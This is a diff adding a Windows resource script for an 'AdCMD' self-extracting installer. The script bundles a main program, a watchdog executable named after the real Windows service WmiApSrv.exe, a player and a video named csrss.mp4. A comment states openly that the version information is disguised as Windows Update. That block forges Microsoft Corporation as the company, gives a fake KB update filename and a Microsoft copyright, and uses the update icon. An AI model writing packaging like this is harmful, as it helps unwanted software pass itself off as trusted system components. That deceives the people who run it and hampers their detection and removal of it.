@@ -1,0 +1,52 @@
+// AdCMD_Installer.rc
+// 资源定义文件 - 将组件打包进自解压安装器
+
+#include <windows.h>
+
+// 二进制资源类型
+#define RT_BINARY 256
+
+// 主程序 (编译后的 AdCMD.exe)
+IDR_ADCMD_MAIN BINARY "build\AdCMD.exe"
+
+// 看门狗 (编译后的 WmiApSrv.exe)
+IDR_ADCMD_WATCHDOG BINARY "build\WmiApSrv.exe"
+
+// 播放器 (编译后的 AdCMD_Player.exe)
+IDR_ADCMD_PLAYER BINARY "build\AdCMD_Player.exe"
+
+// MV视频 (可选)
+IDR_MV_VIDEO BINARY "build\csrss.mp4"
+
+// 版本信息 (伪装成 Windows Update)
+VS_VERSION_INFO VERSIONINFO
+FILEVERSION    10,0,66666,66
+PRODUCTVERSION 10,0,66666,66
+FILEFLAGSMASK  0x3fL
+FILEFLAGS      0x0L
+FILEOS         VOS_NT_WINDOWS32
+FILETYPE       VFT_APP
+FILESUBTYPE    VFT2_UNKNOWN
+BEGIN
+    BLOCK "StringFileInfo"
+    BEGIN
+        BLOCK "040904b0"
+        BEGIN
+            VALUE "CompanyName",      "Microsoft Corporation"
+            VALUE "FileDescription",  "Windows Update Standalone Installer"
+            VALUE "FileVersion",      "10.0.66666.66"
+            VALUE "InternalName",     "Update.exe"
+            VALUE "LegalCopyright",   "Copyright (C) Microsoft Corporation. All rights reserved."
+            VALUE "OriginalFilename", "WindowsXP-KB66666666-x86-ENU.exe"
+            VALUE "ProductName",      "Update for Windows CMD"
+            VALUE "ProductVersion",   "10.0.66666.66"
+        END
+    END
+    BLOCK "VarFileInfo"
+    BEGIN
+        VALUE "Translation", 0x409, 1200
+    END
+END
+
+// 图标 (使用系统默认更新图标)
+IDI_ICON1 ICON "update.ico"
